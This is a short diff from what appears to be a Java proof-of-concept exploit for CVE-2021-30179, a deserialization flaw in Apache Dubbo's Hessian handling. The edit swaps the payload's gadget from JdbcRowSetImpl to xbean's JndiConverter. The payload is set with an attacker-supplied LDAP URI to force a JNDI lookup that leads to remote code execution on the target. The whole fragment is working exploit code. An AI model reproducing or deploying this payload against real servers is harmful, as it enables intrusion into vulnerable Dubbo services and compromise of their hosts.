@@ -86,10 +86,8 @@ public class CVE202130179 {
     }
 
     private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
-//        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
-//        javaBeanDescriptor.setProperty("asText",ldapUri);
-        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("com.sun.rowset.JdbcRowSetImpl",7);
-        javaBeanDescriptor.setProperty("AutoCommit",ldapUri);
+        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
+        javaBeanDescriptor.setProperty("asText",ldapUri);
         out.writeObject(new Object[]{javaBeanDescriptor});
         HashMap map = new HashMap();
 
